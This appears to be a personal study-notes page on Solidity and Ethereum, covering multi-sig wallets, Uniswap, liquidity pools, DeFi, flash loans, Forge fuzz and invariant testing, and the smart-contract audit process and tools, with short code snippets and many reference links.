<a href="https://university.alchemy.com/course/ethereum/md/639119b0fdaf860004511e96" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's a Multi-Sig Contract?</h2>
<p>A <strong>multi-signature contract</strong> is a smart contract designed so that <em>multiple</em> signatures from different addresses are needed for a transaction to be executed.</p><p></p><p>Since multi-sigs are powered by <em>multiple</em> keys, they <strong>avoid a <em>single point of failure</em>, which makes it significantly harder for funds to be compromised.</strong> ‚õì This design provides a higher degree of security against lost or compromised keys. üîëüóùüîê</p><p></p><p>Even if there is a malicious party in the multi-sig contract, they would need to corrupt a majority of the holders to compromise the wallet entirely.</p><p></p><p>With this setup, it doesn‚Äôt matter whether one individual loses their key, as there will be other individuals that can approve transactions, kick out the compromised key and re-add the compromised user under a new address. Boom! üí•</p>
<a href="https://university.alchemy.com/course/ethereum/md/63b88bdd3902d30004e1ea32" target="_blank" rel="noopener noreferrer">link</a>

<h2>Multi-Sig Contract Wallet Use Cases</h2>
<ol><li><p><strong>Families</strong>: Inheritance, Wills, Approved Expenditure of House Expenses</p></li><li><p><strong>Businesses/Startups</strong>: Business Expenses, Treasury Management, Embezzlement Protection</p></li><li><p><strong>Teams/Organizations</strong>: Team Jerseys, Travel Expenses</p></li></ol><p></p><p>Thanks to multi-signature contracts, all of these groups are empowered to manage their finances in a more secure and transparent manner.</p>
<a href="https://university.alchemy.com/course/ethereum/md/63b88bdd3902d30004e1ea32" target="_blank" rel="noopener noreferrer">link</a>

<h2>Secp256k1 Example</h2>
<a href="https://gist.github.com/monirshimul/1cbfad81fe2e8e1705d7232ac6a7bd3a" target="_blank" rel="noopener noreferrer">link</a>

<h2>Guide for a full set up of Hardhat with a browser wallet</h2>
<a href="https://www.web3.university/article/how-to-build-a-react-dapp-with-hardhat-and-metamask" target="_blank" rel="noopener noreferrer">link</a>

<h2>Simple faucet time based</h2>
<a href="https://github.com/marvinkruse/simple-faucet/blob/master/smartcontract/faucet.sol" target="_blank" rel="noopener noreferrer">link</a>

<h2>Solidity Liquidity Pool</h2>
<a href="https://medium.com/@JalelTounsi/liquidity-pools-from-solidity-to-ui-4bf9e11449c4" target="_blank" rel="noopener noreferrer">link</a>

<h2>How to compare strings in solidity?</h2>
<pre><code class="language-php">// SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    contract StringComparison {
        function compareStrings(string memory a, string memory b) public pure returns (bool) {
            return keccak256(abi.encodePacked(a)) == keccak256(abi.encodePacked(b));
        }
    }</code></pre>
<a href="https://ethereum.stackexchange.com/questions/30912/how-to-compare-strings-in-solidity" target="_blank" rel="noopener noreferrer">link</a>

<h2>Smart contract Developer's Mindmap</h2>
<a href="https://github.com/Quillhash/Smart-Contract-Developer-Roadmap" target="_blank" rel="noopener noreferrer">link</a>

<h2>Companies that are hiring Smart Contract Developers</h2>
<p><a href="https://www.quillaudits.com/careers#Jobs" target="_blank" rel="noopener noreferrer">QuillAudits</a></p>
<p><a href="https://boards.greenhouse.io/wyndlabs" target="_blank" rel="noopener noreferrer">Green</a></p>

<h2>Solidity Geeks for Geeks</h2>
<a href="https://www.geeksforgeeks.org/solidity/" target="_blank" rel="noopener noreferrer">link</a>

<h2>Expecting reverts with vm.expectRevert</h2>
<pre><code>vm.expectRevert("incorrect amount");</code></pre><p></p><p>Note that vm.expectRevert must be called right before doing the function that we expect to revert. Now if we delete the require statement, it will revert, so we have better modeled the intended functionality of the smart contract.<br><br><br></p>

<h2>How much ETH do you need to mine POS?</h2>
<p>Ethereum requires 32 ETH to be staked before a user can operate a node.</p>

<h2>How to Become an Ethereum Smart Contract Engineer | Road Map 2021</h2>
<a href="https://www.youtube.com/watch?v=WFjeWP148jM" target="_blank" rel="noopener noreferrer">link</a>

<h2>Interesting Solidity resources</h2>
<p><a href="https://github.com/jklepatch/eattheblocks" target="_blank" rel="noopener noreferrer">eat the blocks</a></p>
<p><a href="https://github.com/fravoll/solidity-patterns" target="_blank" rel="noopener noreferrer">solidity patterns</a></p>
<p><a href="https://www.quicknode.com/builders-guide?ref=blog.quicknode.com" target="_blank" rel="noopener noreferrer">builders guide</a></p>

<h2>Projects to build using Solidity</h2>
<ol><li><p>Hello, World! Contract</p></li><li><p>Token Sale Contract</p></li><li><p>Voting Contract</p></li><li><p>Crowdfunding Contract</p></li><li><p>Decentralized Exchange (DEX)</p></li><li><p>NFT Marketplace</p></li><li><p>Multi-Signature Wallet</p></li><li><p>Escrow Contract</p></li><li><p>Decentralized Autonomous Organization (DAO)</p></li><li><p>Supply Chain Management</p></li></ol>
<a href="https://metana.io/blog/solidity-projects-for-beginners-building-a-strong-foundation/" target="_blank" rel="noopener noreferrer">link</a>

<h2>Beginner Roadmap to Smart Contract Auditing</h2>
<a href="https://www.youtube.com/watch?v=-469Gcye-ZE" target="_blank" rel="noopener noreferrer">link</a>

<h2>What is the job description of Solidity?</h2>
<ul><li><p>Designing, developing, and testing smart contracts.</p></li><li><p>Analyzing and debugging smart contracts.</p></li><li><p>Integrating smart contracts with other applications.</p></li><li><p>Maintaining and updating smart contracts.</p></li><li><p>Writing documentation for smart contracts.</p></li><li><p>Working with other developers and stakeholders to ensure that smart contracts meet the requirements.</p></li><li><p>Staying up-to-date on the latest developments in Solidity and blockchain technology.</p></li></ul>

<h2>What is Uniswap?</h2>
<p>The Uniswap Protocol is one of the most important protocols for decentralized exchange of tokens on Ethereum Blockchain.</p><p>It's deployed as a set of smart contracts and its:</p><ol><li><p>decentralized</p></li><li><p>permissionless</p></li><li><p>censorship resistant</p></li></ol><p></p><p>Uniswap is built on the concept of Liquidity Pools and Automated Market Makers.</p><p></p><p>Initial version of Uniswap was published to Ethereum mainnet was on Nov. 2nd 2018 by Haiden Adam.</p><p></p><p>At the time of building the first version of Uniswap protocol Ether Delta was pretty much the only Decentralized Exchange with some traction. It had poor UI and lacked liquidity.</p><p></p><p>In May 2020 Uniswap launched a Uniswap 2. The main feature was the addtion of ERC20 - ERC20 Liqudity Pool. Before V2 each Liquidity Pool had to consist of ETH as one of the currencies. So to trade from USDC to DAI, the user would have to trade their USDC for ETH and ETH for DAI which usually resulted in higher gas fees and more slippage. It was also better for Liquidity providers who didn't want to provide ETH and expose themselves to impermanent loss.</p><p></p><p>All V2 contracts were written in Solidity as opposed to V1 contracts were written in Vyper.</p><p></p><p>Sushiswap was aiming to directly competing with Uniswap by forking the project and adding a reward for Uniswap Liquidity Providers and eventually stealing Uniswap Liquidity into the Uniswap platform.</p><p></p><p>At around August 2020 Uniswap overcame Kraken and later even coinbase in the daily trading volume. Which is incredible because it had only 10 employees compared to Coinbase having a 1000 employees.</p><p></p><p>UNI token was announced later in 2020. Everyone who had used Uniswap even once before September 1 was eligable to claim 400 UNI tokens that were worth ~$1200. The UNI tokens were distributed to around 50 000 ethereum addresses making them the most widely distributed tokens in the space. On top of that the Liqudity Providers were also retrospectively rewarded with extra UNI tokens.</p><p></p><p>The Uniswap team wanted to further decentralize the protocol making it a publicly owned self sustainable financial infrastructure while protecting its indestructable autonomous qualities while working on Uniswap V3.</p><p></p><p>The token holders will be able to participate in Uniswap Governance by voting on different proposals or delegating their votes to a third party.</p>

<h2>What are Liquidity Pools?</h2>
<p>Liquidity Pools are in essence pools of tokens locked in a smart contract.</p><p>They are used to facilitate trading by providing liquidity and are extensively used by decentralized exchanges aka DEXES.</p><p></p><p>They become widely popularized by Uniswap.</p><p></p><p>In normal traditional centralized exchanges like coinbase and binance and even nasdaq and nyse work by using the order book model. In this model buyers and seller come together and place their orders. For trades to happen buyers and seller have to converge on the price.</p><p></p><p>Market makers are always willing to buy or sell an asset by doing that they provide liquidity so that the users can always trade and they dont have to wait for another counterparty to show up.</p><p></p><p>Without market makers an exchange becomes instantly illiquid and become unusable for users.</p><p></p><p>Ethereum is really not a viable option for Order book exchange where there is huge amount of orders and order cancelations. Because Ethereum can only do 12-15 transactions per second. On top of that every interaction with a smart contract costs a gas fee. Market makers would go bankrupt because of the gas fees.</p><p></p><p>There was a need to come up with some new and that is where Liquidity Pools come into play.</p><p></p><p>How Liquidity Pools work?</p><p>A single liquidity pool holds 2 tokens and each pool creates a new market for that particular pair of tokens.</p><p>When a new pool is created the first liquidity provider is the one that sets the initial price of the pool. He is insentivised to supply equal value of both tokens in the pool.</p><p>If the initial price of the tokens diverges from global market price it creates an instant arbitrage opportunity that can result in lost capital for the liquidity provider.</p><p></p><p>When a liquidity is supplied to a pool the liquidity provider receives special tokens in proportion to how much liquidity they supplied to the pool.</p><p></p><p>When a trade is facilitated by the pool a 0.3% fees is proportionally distributed among all the liquidity token holders.</p><p></p><p>If the liquidity provider wants to get their underlying liquidity back plus any acrude fees they must burn their liquidity provider tokens.</p><p></p><p>Each token swap that a liquidity pool facilitates results in a price adjustment according to a deterministic pricing algorithm. This mechanism is also called an Automated Market Maker.</p><p></p><p>Basic Liqudity pools like uniswap use constant product market maker algorithm that makes sure that the product of the quantities of the 2 supplied tokens always remains the same.</p><p></p><p>The pool can always provide liquidity no matter how large the trade is by using a magic algorithm. :)</p><p></p><p>Ratio of the tokens dictates the price.</p><p></p><p>Potential risks of Liquidity Pools are:</p><p>Standard ones: bugs, admin keys, systemic risks</p><p>New ones: Impermanent loss, Liqudity Pool Hacks.</p>

<h2>What is DEFI?</h2>
<p>DEFI or decentralized system is a new movement open to everybody and doesnt require trusting intermediaries like banks.</p><p></p><p>It relies heavily on cryptography, blockchain and smart contracts.</p><p></p><p>Most and really almost all DEFI projects are built on the Ethereum. It has a robust programming language Solidity that allows writing advanced smart contract that can contain all the necessary logic for DEFI apps.</p><p></p><p>Ethereum has the most developed eco system across all the smart contract platforms. </p><p></p><p>MakerDao was one of the first projects in the DEFI space. Founded in 2015 allowed users to lock in collateral and generate DAI which is a stable coin that follows the price of US dollar.</p><p></p><p>DAI can be used for saving on Oasis Makers platform. This recreates one of the pillars of the financial system: lending and borrowing.</p><p></p><p>Important feautres of DEFI are:</p><ol><li><p>Lending and Borrowing</p></li><li><p>Stable coins</p></li><li><p>Decentralized Exchanges(DEX)</p></li><li><p>Derivatives</p></li><li><p>Margin trading</p></li><li><p>Insurance</p></li></ol><p></p><p>COMPOUND is the biggest DEFI project in the lending category. Its an algorithmic, autonomous interest rate protocol. Users can supply assets and start making interest. Supplied assets can act as collateral for borrowing other assets.</p><p>Another popular project in this cateogry is AAVE.</p><p></p><p>With clever use of smart contracts and certain incentives we can create stable coin that is pegged to the US dollar without holding any dollars in the real world.</p><p>DAI is a good example of algorithmic stable coin.</p><p>There are multiple another non algoritmic stable coins: USDT, USDC. The problem with them is that they are centralized meaning there is a company behind them responsible for holding equivalent of the value of stable coins in US dollar or other assets.</p><p>Stable coins gained a lot of popularity and are used in DEFI applications like Compoud or Aave.</p><p></p><p>Decentralized Exchanges in opposite to centralized exchanges allow for exchanging crypto assets in a completely decentralized and permisionless way without giving up custody of the coin.</p><p>There are two types of DEXEs: </p><ul><li><p>Liquidity based - Uniswap, Kyber, Balancer and Bancor</p></li><li><p>Order book based - Loopring, Idex</p></li></ul><p></p><p>Derivatives are contracts that derive their value from a performance of an underlying asset.</p><p>Syntethix is decentralized platform that provides on chain exposure to different assets.</p><p></p><p>Margin Trading is the practice of using borrowed funds to increase the position in a certain asset.</p><p>The main apps are: DYDX, Fulcrum</p><p></p><p>Insurance provides certain guarantees of compensation in return for a payment of a premium.</p><p>It's protection in smart contract failures and protection of deposits.</p><p>Most popular apps: Nexus Mutual, Opyn</p><p></p><p>Oracle Services focus on delivering reliable data feeds from the outside world into the smart contract.</p><p>Most popular platform is Chainlink.</p><p></p><p>DEFI:</p><ul><li><p>permissionless no KYC - Know your customer</p></li><li><p>open source and encouraging open collaboration</p></li><li><p>censorship resistant</p></li><li><p>cheaper mostly network fees</p></li><li><p>built on the blockchain</p></li></ul><p></p><p>CEFI:</p><ul><li><p>permissioned, requires KYC</p></li><li><p>close, decisions made behind closed doors</p></li><li><p>can be censored</p></li><li><p>expensive, intermmediaries charging hefty fees</p></li><li><p>built on old foundations</p></li></ul><p></p><p>DEFI RISKS: </p><ul><li><p>bugs in smart contracts and protocol changes</p></li><li><p>check how much decentralized the DEFI project really is</p></li><li><p>what is the shutdown procedure when something goes wrong - does someone have an admin key that someone can use to shutdown the protocol? Or maybe there is some onchain governance that can make that decision</p></li><li><p>systemic risk - asset prices sharply losing their value which may result in a cascade of liquidations across multiple defi protocols</p></li><li><p>network fees and congestion - ethereum 2.0 and 2nd layer scaling solution can solve this problem</p></li><li><p>subtle features/changes to protocols may incentivise users to certain non obvious actions that can cascade across multiple protocols </p></li></ul>

<h2>What are Flash Loans?</h2>
<p>How can they be used to borrow millions of dollars worth of crypto with no collateral?</p><p></p><p>Flash Loan is a feature that allows you to borrow any available amount of assets from a designated smart contract pool with no collateral.</p><p>They are useful building blocks in DEFI as they can be used for:</p><ul><li><p>arbitrage</p></li><li><p>swapping collateral</p></li><li><p>self liquidation</p></li></ul><p></p><p>They were popularized by AAVE and DYDX.</p><p></p><p>Flash Loan has to borrowed and repaid within the same blockchain transaction.</p><p></p><p>AAVE and DYDX developed smart contracts that allowed defi users to borrow different coins from a designated pool under the condition that they are repaid within the same ethereum transaction.</p><p></p><p>There is usually a fixed costs for using Flash Loans. For example AAVE requires that the borrowed coins are repaid + 0.09% fee. This fee is split among depositors who provide the funds that can be borrowed and integrators who facilitate the use of AAVE flash loan api.</p><p></p><p>Once the amount is borrowed from the lending pool it can be used for any other arbitrary actions assuming that at the end of the chain of different steps the initial flash loan is repaid.</p><p></p><p>Because the borrowed amount has to be always repaid there is no risk involved.</p><p></p><p>The only risk is the always present smart contract and platform risk.</p><p></p><p>Arbitrage - flash loans can magnify the profit of executing a successful arbitrage opportunity.</p><p></p><p>Network fees - arbitrage transactions with multiple steps can become quite expensive. Always take into consideration network fees when calculating your profits.</p><p>There is a high chance that someone else will spot the same opportunity and will manage to get their transaction mined ahead of you. This is called Front running.</p><p>Bots that monitor the mempool can pick up your profitable arbitrage opportunity and send the same transaction with a higher gas fee profiting them instead of you. Basically stealing your arbitrage opportunity.</p><p></p><p>Flash loans were used in most of the recent DEFI hacks that allowed the hacker to magnify their potential profits as they do not require any upfront funds.</p><p></p><p>Famous flash loan hack was BZX HACK where a flash loan was able to manipulate the uniswap oracle price.</p>

<h2>How to clone any smart contract</h2>
<p>Go to open sea search for a contract, click on details, go down and there is the contract address, click on it, go to ether scan and there click on contract to get the source code</p>
<a href="https://www.youtube.com/watch?v=18TSUZ53m1Q" target="_blank" rel="noopener noreferrer">link</a>

<h2>Cryptocurrency Exchange Hacks (Updated List For 2024)</h2>
<a href="https://www.hedgewithcrypto.com/cryptocurrency-exchange-hacks/" target="_blank" rel="noopener noreferrer">link</a>

<h2>Gas Calculating Playground</h2>
<a href="https://gas-playground.vercel.app/" target="_blank" rel="noopener noreferrer">link</a>

<h2>Interesting Solidity Github Repositories to learn from</h2>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://github.com/defidotmoney/dfm-contracts/">https://github.com/defidotmoney/dfm-contracts/</a></p>

<h2>Solidity Code Layout</h2>
<p>In the solidity document (<a target="_blank" rel="noopener noreferrer nofollow" href="https://docs.soliditylang.org/en/v0.8.17/style-guide.html">https://docs.soliditylang.org/en/v0.8.17/style-guide.html</a>), there are the following conventions for code layout: Layout contract elements in the following order: 1. Pragma statements, 2. Import statements, 3. Interfaces, 4. Libraries, 5. Contracts. Inside each contract, library or interface, use the following order: 1. Type declarations, 2. State variables, 3. Events, 4. Modifiers, 5. Functions. Functions should be grouped according to their visibility and ordered: 1. constructor, 2. receive function (if exists), 3. fallback function (if exists), 4. external, 5. public, 6. internal, 7. private.</p>

<h2>What I learned from reading Smart Contract Audits?</h2>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://github.com/seamless-protocol/audits/blob/main/Seamless-Protocol-ZAN-final-report-2023-10-16.pdf">Seamless Protocol Audit</a></p><p>Use a fixed compiler version, and consider whether the bugs in the selected compiler version will affect the contract.</p><p></p><p>For constants, if the visibility is set to public, the compiler will automatically generate a getter function for it, which will consume more gas during deployment.</p><p>It is recommended to set the visibility of constants to private instead of public.</p><p></p><p>It is recommended to follow the solidity code layout conventions to improve code readability.</p><p></p><p>In external or public functions, the storage location of function parameters should be set to calldata to save gas.</p><p></p><p>It is recommended to perform zero address verification on the input parameters of the address type.</p><p></p><tools>Firstly, when possible, privileged functions that change critical parameters should emit events and have timelocks. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with time locks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. </p><p>Secondly, we suggest allowing only multi-signature wallets to call the function to reduce the likelihood of an attack. </p><p>Thirdly, we recommend taking extra precautions with the various DEFAULT_ADMIN_ROLE and use OZ‚Äôs AccessControlDefaultAdminRules library to enforce additional security measures regarding this role.</p>

<h2>Synthetix Staking Rewards Contract Explained</h2>
<p>Let's denote:</p><ul><li><p>Rp‚Äã: Total rewards pool for the period (e.g., weekly rewards pool).</p></li><li><p>Su‚Äã: Total amount of tokens staked by the user uuu.</p></li><li><p>St‚Äã: Total amount of tokens staked across the entire network.</p></li><li><p>Ru: Rewards allocated to user uuu.</p></li></ul><p>The formula to calculate the staking rewards Ru‚Äã for a user u would typically be:</p><p>Ru=Rp*(Su/St)</p><p></p><p>Example:</p><ul><li><p>Total rewards pool Rp‚Äã for the week is 10,000 SNX tokens.</p></li><li><p>User u has staked 1,000 SNX tokens.</p></li><li><p>Total tokens staked across the network St is 100,000 SNX tokens.</p></li></ul><p>Then:</p><p>Ru = 10000*(1000/100000) = 100</p><p></p><ul><li><p>This formula provides a basic illustration of how staking rewards are often calculated in DeFi protocols. Actual protocols may have variations or additional factors considered in reward calculations, such as vesting periods, reward multipliers, or adjustments based on protocol-specific rules.</p></li><li><p>Always refer to the specific protocol's documentation or smart contract code for precise details on how rewards are calculated and distributed.</p></li></ul>

<h2>Fuzz Testing</h2>
<p>Forge supports property based testing, it's a way of testing general behaviors as opposed to isolated scenarios.</p><p></p><p>Forge will run any test that takes at least one parameter as a property-based test.</p><p>If you give it parameter type uint256 it randomly generated integers up to 2**256.</p><p></p><p>The default value of ether that a test contract is given is 2**96wei.</p><p></p><p>You may want to exclude certain cases using the <code>assume</code> cheatcode. In those cases, fuzzer wil ldiscard the inputs and start a new fuzz run.</p><pre><code>function testFuzz_Withdraw(uint96 amount) public {
    vm.assume(amount &gt; 0.1 ether);
    // snip
}</code></pre><p></p><p>Results:</p><p>"runs" refers to the amount of scenarios the fuzzer tested. By default the fuzzer will generate 256 scenarios. You can change this in the fuzzer config.</p><p>‚ÄúŒº‚Äù (Greek letter mu) is the mean gas used across all fuzz runs</p><p>‚Äú~‚Äù (tilde) is the median gas used across all fuzz runs</p><p></p><p>Fuzz test fixtures are used to make sure a certain set of values is used as inputs for fuzzed parameters.</p><p></p><p>Need to be defined as storage arrays prefixed with fixture</p><p>or as as functions name with fixture prefix</p><pre><code>uint32[] public fixtureAmount = [1, 5, 555];
function fixtureOwner() public returns (address[] memory)</code></pre><p></p>

<h2>Invariant Testing</h2>
<p>Invariant testing is a powerful tool to expose incorrect logic in protocols.</p><p>Function call sequesnces are randomized and have fuzzed inputs. This way invariant testing can expose false assumptions and incorrect logic in edge cases and highly complex protocol states.</p><p></p><p>runs: Number of times that a sequence of function calls is generated and run.</p><p>depth: Number of function calls made in a given run. Invariants are asserted after each function call is made. If a function call reverts, the depth counter still increments.</p><p></p><p>Invariant tests are denoted by prefixing the function name with <code>invariant</code>.</p><p></p><p><code>afterInvariant</code> function is called at the end of each invariant run. This function can be used for logging campaign metrics and post fuzz campaign testing.</p><p></p><p>Invariants are conditions expressions that should always be true over the course of a fuzzing campaign. A good invariant testing suite should have as many invariants as possible.</p><p></p><p>Examples of invariants are:</p><p>‚ÄúThe xy=k formula always holds‚Äù for Uniswap</p><p>‚ÄúThe sum of all user balances is equal to the total supply‚Äù for an ERC-20 token.</p><p></p><p><br><br></p>

<h2>Differential testing</h2>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://en.wikipedia.org/wiki/Differential_testing">Differential testing</a> cross references multiple implementations of the same function by comparing each one‚Äôs output. Imagine we have a function specification <code>F(X)</code>, and two implementations of that specification: <code>f1(X)</code> and <code>f2(X)</code>. We expect <code>f1(x) == f2(x)</code> for all x that exist in an appropriate input space. If <code>f1(x) != f2(x)</code>, we know that at least one function is incorrectly implementing <code>F(X)</code>. This process of testing for equality and identifying discrepancies is the core of differential testing.</p><p></p><p>Differential fuzzing is an extension of differential testing. Differential fuzzing programmatically generates many values of <code>x</code> to find discrepancies and edge cases that manually chosen inputs might not reveal.</p><p></p><p>Some real life uses of this type of testing include:</p><ul><li><p>Comparing upgraded implementations to their predecessors</p></li><li><p>Testing code against known reference implementations</p></li><li><p>Confirming compatibility with third party tools and dependencies</p><p></p></li></ul>

<h2>Ephemery Test Net</h2>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://ephemery.dev/">Landing page</a></p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://github.com/ephemery-testnet/ephemery-resources?tab=readme-ov-file">Github</a></p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://faucet.bordel.wtf/">Faucet</a></p><p></p><p>My first faucet transaction, 250 ETH<br><a target="_blank" rel="noopener noreferrer nofollow" href="https://explorer.ephemery.dev/tx/0x44e26e95f390062fe03140e38abef86341309ce9855f0adb88bd7b3108323ba9">https://explorer.ephemery.dev/address/0x6Cc9397c3B38739daCbfaA68EaD5F5D77Ba5F455</a><br><br></p>

<h2>The Current State of Web3 Security: A Crucial Call to Action!</h2>
<p>The current state of Web3 security is pretty objectively terrible. Let's look at where we're at and what needs to be done to improve security in the industry.</p><h3>A Shocking Reality: Billions Lost in Hacks</h3><ul><li><p><strong>Billion-Dollar Troubles:</strong> Did you know in 2022 alone, a jaw-dropping $3.1 billion was stolen in crypto hacks? And 2023 isn't looking much better. It's a call to arms for all of us in the Web3 space!</p></li><li><p><strong>DeFi's Dilemma:</strong> Imagine this - about 7% of DeFi's total value is getting swiped by hackers. That's like saying, "Hey, deposit your money here, but there's a scary chance it might vanish!"</p></li></ul>

<h2>What is Fuzz Testing?</h2>
<p>Fuzz testing involves mainly understanding your system's invariants and writing tests that can execute numerous scenarios. This is either achieved through stateless fuzzing, which provides random data alone with each run independent of the last, or stateful fuzzing, allowing both random data and random function calls subsequently on the same contract. This is the new standard for web3 security.</p><p></p><p>Going forward, aim to fully understand the invariants in systems you're working on, and write fuzz tests to ensure they are not broken</p><p></p><p>"Fuzz testing is a technique that some of the top protocols are yet to adopt, yet it can aid in discovering high severity vulnerabilities in smart contracts." - Alex Rohn, co-founder at Cyfrin.<br><br></p>

<h2>ERC20 and ERC721</h2>
<p>ERC20s are tokens that exist and function on a blockchain network using a predefined standard called the ERC20 token standard. This standard is essentially a set of rules that dictate certain functions a token should have, allowing it to interact seamlessly with other tokens on the network.</p><p></p><p>ERC20 tokens find extensive use in a number of areas. They can serve as governance tokens, allowing token holders to vote on various matters within a DApp (Decentralised Application). They can be used to secure the underlying network. They can also represent some type of static asset, and much more. The sky's the limit when it comes to what you can achieve with ERC20 tokens.</p><p></p><p>NFT stands for non-fungible token. Unlike ERC20 tokens, such as LINK, DAI etc, each NFT is entirely unique, and no two tokens can be interchanged.</p><p></p><p>So to sum up, NFTs are unique, non-interchangeable tokens best thought of as indestructible digital pieces of art with a permanent history detailing their ownership and alterations.</p><h2></h2><p>To keep it simple, the main distinction between ERC721 and ERC20 tokens is that each ERC721 token has a unique Token ID, an attribute that indirectly represents the asset linked to that token.</p>

<h2>Storage in Solidity</h2>
<p>The first advanced feature we'll be covering today is storage in smart contracts. Every smart contract includes this integral element. This critical component is the space allotted to your variables within the contract.</p><p></p><p>When you create a state variable within your contract, an individual storage slot is carved out just for that variable.</p><p></p><p>It's worth noting, however, that constants or immutable variables do not occupy space in storage. This unique trait is due to their nature of being stored directly within the contract's bytecode.</p><p></p><p>For variables that are declared inside a function, their existence is ephemeral and scoped merely to the span of that function. These variables do not persist inside the contract and are not stored in Storage. Instead, they're stashed in a different memory data structure, which deletes them as soon as the function has finished execution.</p><p></p><p>Finally, the memory keyword. Primarily used with strings, memory is needed because strings are dynamically sized arrays. By using this keyword, we tell Solidity that string operations are to be performed not in Storage, but in a separate memory location.</p><p></p><p>Solidity needs this explicit instruction because arrays and mappings require more space, hence the need to ensure that space is allocated in the appropriate data structure.</p>

<h2>What are the Fallback and Receive functions?</h2>
<p>By default, Solidity smart contracts reject any Ether (ETH) sent to them.</p><p></p><p>These two specific functions - fallback and receive - enable a contract to accept and react to native ETH sent to it. Both these functions can be made "external payable", indicating that they can receive and handle ETH.</p><p></p><p>To put it simply, consider the case of sending ETH to a smart contract without any data. In such an instance, the receive function would be called, resorting to fallback if the receive function does not exist.</p><p></p><p>On the other hand, if there is data, Solidity will skip straight to the fallback function, bypassing the receive function entirely.</p><p></p><p>Default Settings in Solidity</p><p>It is worthwhile to note that the fallback function may or may not be payable. If the contract lacks a receive function and the fallback function isn't payable, then the fallback function won't be called when you send ETH to the contract.</p><p></p><p>By the same token, a contract that does not contain any of these functions will reject any ETH sent to it. In fact, Solidity will automatically compile this contract to reject ETH - with at least one notable exception we'll go over later.</p>

<h2>Audit process</h2>
<ol><li><p>Get context - understand the project, its purpose and unique aspects</p></li><li><p>Use tools - employ relevat tools to scan and analyze the codebase</p></li><li><p>Manual reviews - make a persnal reviews of the code and spot out unusual or vulnerable code</p></li><li><p>Write a report - document all findins and recommendations for the dev team</p></li></ol><p></p><p>Initial review</p><ul><li><p>Scoping - go through the code to scope it, how much might be required for the audit and establish pricing. No deep dive at this stage</p></li><li><p>Reconnaissance - start walking through the code, run tools, interact with the protocol in effort to break it</p></li><li><p>Vulnerability Identification - determine which vulnerabilities are present and how they're exploited as well as mitigation</p></li><li><p>Reporting - compile a report detailing all of the identified vulnerabilities and recommendations to make the protocol more secure</p></li></ul><p></p><p>"You job is to do whatever it takes to make the protocol more secure."</p><p></p><p>Procotol Fixes - at this stage the protocol will take and auditors report and work towards implementing suggested changes and mitigation.</p><p></p><p>Mitigation Review - once a protocol has employed and tested all of the recommended fixes, a review is conducted with a focus on verifying that previously reported vulnerabilitiesi have been resolved.</p><p></p><p>Remember, the goal of conducting contract audits isn't simply to tick a box. It's about ensuring the security and smooth running of the smart contract at all stages of its lifecycle. The more audits you conduct, the better you become at identifying potential security issues.</p><p></p><p>Before deploying your contract, think hard about the security measures in place and ensure to maintain and monitor your code post-deployment.</p><p></p><p>The key takeaway here is this: Smart contract security is a crucial part of the smart contract development lifecycle and should be treated with as much care as the development of the smart contract itself.</p><p></p>

<h2>The Rekt Test</h2>
<p>The Rekt Test is highly important as it poses a set of questions to gauge your protocol's preparedness for an audit.</p><p>Should your protocols fail to answer these questions, the chances are that they're not audit-ready.</p><p></p><ul><li><p>Do you have all actors roles and privileges documented?</p></li><li><p>Do you keep documentation of external services contracts and Oracles?</p></li><li><p>Do you have a written and tested incident response plan?</p></li><li><p>Do you document the best ways to attack your system?</p></li><li><p>Do you perform identity verification and background checks on all employees?</p></li><li><p>Do you have a team member with security defined in the role?</p></li><li><p>Do you require hardware security keys for production systems?</p></li><li><p>Do you define key invariants for your system and test them on every commit?</p></li><li><p>Do you use the best automated tools to discover security issues in your code?</p></li><li><p>Do you undergo external audits and maintain a vulnerability disclosure or bug bounty program?</p></li><li><p>Have you considered and mitigated avenues for abusing users of your system?</p></li></ul><p></p><p>As developers, you must be able to answer all these queries before you proceed with an audit. If you're dealing with a protocol that fails to answer these questions, it's best to tell them the protocol isn't ready to ship, or arguably audit, until they can.</p><p></p><blockquote><p>"Delegate responsibility to someone on your team for security - Give your project a sense of ownership and a point person to handle any security breaches."</p></blockquote><p></p>

<h2>Tools for Security Reviews</h2>
<p>Test Suites</p><p></p><p>Static Analysis - automatically checks for issues without executing the code</p><ul><li><p>Slither, 4analyzer, Mythril, Aderyn</p></li></ul><p></p><p>Fuzz Testing</p><ul><li><p>fuzz testing - providing random data as inputs during testing</p></li><li><p>stateful fuzz testing - providing random data as inputs and the system remembers the state of the last fuzz and continues with a new fuzz test</p></li><li><p>others: differential testing, chaos testing</p></li></ul><p></p><p>Formal Verifitcation - converting the codebase into mathematical expressions and deploying mathematical proofs to authenticate that the code does or does</p><p>not do something specific.</p><ul><li><p>Certora</p></li></ul><p></p><p>AI tools - at the present, using AI tools could serve as a sanity check or aid in looking for something quickly, but if a project suggest it hsa been audited by an AI tool, it is best to be skeptical and question if the project takes security seriously.</p><ul><li><p>Phind</p></li><li><p>Chatgpt</p></li><li><p>Co-pilot</p></li></ul><p></p><p>An important takeaway for you is that around 80% of actual bugs and competitive audit bugs are not auto-detectable by machines, including our present-day AI tools. This revelation underlines two key facts:</p><p></p><p>Our current tools aren't up to the mark, and we need better ones.</p><p></p><p>Human auditors and human security researchers remain paramount. The vast majority of bugs often stem from business logic and incorrect implementations rather than common solidity or cryptography oddities.</p><p></p>

<h2>Top Web3 Attacks</h2>
<p>As I've mentioned a few times, we need to have this attackers and defenders mindset. We need to always be expanding our knowledge, we need to always be leveling up.</p><p></p><ol><li><p>Stolen Private Keys</p></li><li><p>Reward Manipulation</p></li><li><p>Price Oracle Manipulation - if the oracle is centralized or if a single oracle is relied upon</p></li><li><p>Insufficient Access Controls - onlyOwner modifiers, multi-sig wallets - just a couple things that could have prevented stolen funds</p></li><li><p>Re-entrancy</p></li></ol><p></p><blockquote><p>Always remember, my friends - Cybersecurity isn't about the systems or the codes; it's about maintaining a mindset. A mindset akin to an endless game of chess, predicting the opponent‚Äôs moves and always staying a step ahead.</p></blockquote>

<h2>Smart Contract Development Life Cycle</h2>
